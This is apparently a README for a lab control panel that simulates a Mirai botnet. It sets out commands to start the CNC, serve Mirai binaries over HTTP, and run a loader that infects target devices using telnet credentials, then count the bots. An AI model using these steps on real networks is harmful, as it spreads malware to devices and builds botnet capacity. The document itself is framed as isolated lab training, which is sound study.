# Lab Control Panel (C2 + Loader)

Isolated lab only. Dashboard UI can start CNC on **C2** and talk to a small **Loader agent** for HTTP bins + `loader.dbg`.

| Role | IP | Component |
|------|-----|-----------|
| C2 | `185.10.20.100` | CNC `:23`, Dashboard `:8080` |
| Loader | `185.10.20.200` | HTTP bins `:80`, Lab agent `:9090`, `loader.dbg` |

Shared token (both hosts): `LAB_TOKEN=lab-only` (change if you want).

---

## One-time setup

### On Loader (`185.10.20.200`)

```bash
# bins for loader.dbg
cd ~/Mirai-Botnet-Simulation-Lab/loader
ls bins/dlr.x86

# HTTP root with mirai binaries (existing lab path)
ls /opt/http-server/bins/mirai.x86

# Start agent (keep running — screen recommended)
cd ~/Mirai-Botnet-Simulation-Lab/loader/lab_agent
./start.sh
# or:
# screen -dmS lab_agent bash -lc 'cd ~/Mirai-Botnet-Simulation-Lab/loader/lab_agent && ./start.sh'
```

Env overrides:

```bash
export LAB_TOKEN=lab-only
export HTTP_ROOT=/opt/http-server
export LOADER_BIN=~/Mirai-Botnet-Simulation-Lab/loader/loader.dbg
export AGENT_PORT=9090
```

### On C2 (`185.10.20.100`)

```bash
# CNC binary present
ls ~/Mirai-Botnet-Simulation-Lab/mirai/release/cnc
# or: export CNC_BIN=/path/to/cnc

cd ~/Mirai-Botnet-Simulation-Lab/dashboard
export LAB_TOKEN=lab-only
export LOADER_AGENT_URL=http://185.10.20.200:9090
./start.sh
# or screen -dmS web ./start.sh
```

Open: `http://185.10.20.100:8080` (**http**, not https)

---

## UI: LabCtl.exe

1. **Start CNC** — local on C2 (`screen -dmS cnc` if available)
2. **Start HTTP bins** — via Loader agent (`python -m http.server 80` in `HTTP_ROOT`)
3. **Run loader.dbg** — form: IP / port / user / pass  
   Same as: `echo "IP:23 user:pass" | ./loader.dbg`  
   Wait for `OK|…` — do not spam re-runs while job is running

Status LEDs: CNC `:23`, Loader agent, HTTP `:80`.

---

## API (dashboard proxies)

| Method | Path | Action |
|--------|------|--------|
| GET | `/api/lab/overview` | C2 + agent status |
| POST | `/api/lab/cnc/start` | Start CNC on C2 |
| POST | `/api/lab/cnc/stop` | Stop CNC |
| POST | `/api/lab/http/start` | Start HTTP on Loader |
| POST | `/api/lab/http/stop` | Stop managed HTTP |
| POST | `/api/lab/loader/run` | `{ip,port,user,pass}` |
| GET | `/api/lab/loader/log` | Last loader job tail |

Loader agent (direct): `http://185.10.20.200:9090` + header `X-Lab-Token: lab-only`

---

## Demo order

1. Loader: agent up  
2. C2: dashboard up  
3. Browser → Start CNC → Start HTTP → Run loader with bot IP  
4. Wait `OK|` → botcount on dashboard  

---

## Safety

- Lab VLAN only; do not expose `:8080` / `:9090` to the internet  
- Loader target IPs allowlisted to lab/private ranges in agent  
- Credentials validated to simple character set (lab passwords)
